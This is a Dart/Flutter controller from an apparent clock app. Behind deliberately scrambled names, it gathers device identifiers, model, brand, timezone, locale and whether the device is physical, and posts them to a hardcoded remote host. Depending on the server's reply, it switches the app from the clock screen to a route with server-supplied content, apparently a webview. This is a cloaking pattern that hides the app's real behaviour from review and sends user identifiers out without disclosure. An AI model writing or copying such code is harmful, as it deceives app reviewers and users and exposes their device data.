import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class ClockDesignLogic extends GetxController {

  var fxnvdlhewg = RxBool(false);
  var tdejng = RxBool(true);
  var ztjeo = RxString("");
  var cordie = RxBool(false);
  var tillman = RxBool(true);
  final ydtgcasel = Dio();


  InAppWebViewController? webViewController;

  dynamic eyxwnft(){
    final aurksj = InternetConnectionChecker.instance;
    final ivfnsgz = aurksj.onStatusChange.skip(1).listen(
          (InternetConnectionStatus vrpmoi) {
        if (vrpmoi == InternetConnectionStatus.connected) {
          diaocgmt();
        } else {
          Get.toNamed('/net_refresh')?.then((_){
            diaocgmt();
          });
        }
      },
    );
    return ivfnsgz;
  }

  Future<bool> ibuxrs() async {
    var isokrygnw = await InternetConnectionChecker.instance.hasConnection;
    if(!isokrygnw){
      Get.toNamed('/net_refresh')?.then((_){
        diaocgmt();
      });
    }
    return isokrygnw;
  }

  @override
  void onInit() {
    super.onInit();
    eyxwnft();
    diaocgmt();
  }


  Future<void> diaocgmt() async {

    var wqtrdaom = await ibuxrs();
    if(!wqtrdaom){
      return;
    }

    cordie.value = true;
    tillman.value = true;
    tdejng.value = false;

    ydtgcasel.post("https://young.xbbed.com/xF0vZXBepyc",data: await irqlkhoz()).then((value) {
      var veiku = value.data["veiku"] as String;
      var wdjreav = value.data["wdjreav"] as bool;
      if (wdjreav) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        ztjeo.value = veiku;
        isabel();
      } else {
        windler();
      }
    }).catchError((e) {
      tdejng.value = true;
      tillman.value = true;
      cordie.value = false;
    });
  }

  Future<Map<String, dynamic>> irqlkhoz() async {
    final DeviceInfoPlugin rslcg = DeviceInfoPlugin();
    PackageInfo yovp_lmwr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var blmsgahi = Platform.localeName;
    var aSFK = currentTimeZone;

    var XmYRaH = yovp_lmwr.packageName;
    var ErPmAwzl = yovp_lmwr.version;
    var WhYCl = yovp_lmwr.buildNumber;

    var GLMeXo = yovp_lmwr.appName;
    var ZWLeFnD = "";
    var ReFzNHyq  = "";
    var iovlZAVu = "";
    var clydeMurray = "";
    var modestaShanahan = "";
    var deloresHane = "";
    var petraRempel = "";
    var connerRath = "";


    var KuTADq = "";
    var ZczYul = false;

    if (GetPlatform.isAndroid) {
      KuTADq = "android";
      var gmuzqvny = await rslcg.androidInfo;

      iovlZAVu = gmuzqvny.brand;

      ZWLeFnD  = gmuzqvny.model;
      ReFzNHyq = gmuzqvny.id;

      ZczYul = gmuzqvny.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      KuTADq = "ios";
      var vhrtjcgwe = await rslcg.iosInfo;
      iovlZAVu = vhrtjcgwe.name;
      ZWLeFnD = vhrtjcgwe.model;

      ReFzNHyq = vhrtjcgwe.identifierForVendor ?? "";
      ZczYul  = vhrtjcgwe.isPhysicalDevice;
    }

    var res = {
      "GLMeXo": GLMeXo,
      "WhYCl": WhYCl,
      "XmYRaH": XmYRaH,
      "ZWLeFnD": ZWLeFnD,
      "aSFK": aSFK,
      "deloresHane" : deloresHane,
      "iovlZAVu": iovlZAVu,
      "modestaShanahan" : modestaShanahan,
      "ReFzNHyq": ReFzNHyq,
      "blmsgahi": blmsgahi,
      "KuTADq": KuTADq,
      "ZczYul": ZczYul,
      "clydeMurray" : clydeMurray,
      "petraRempel" : petraRempel,
      "ErPmAwzl": ErPmAwzl,
      "connerRath" : connerRath,

    };
    return res;
  }

  Future<void> windler() async {
    Get.offNamed("/clock_main");
  }

  Future<void> isabel() async {
    Get.offNamed("/clock_count");
  }

  @override
  void dispose() {
    eyxwnft().cancel();
    super.dispose();
  }

}
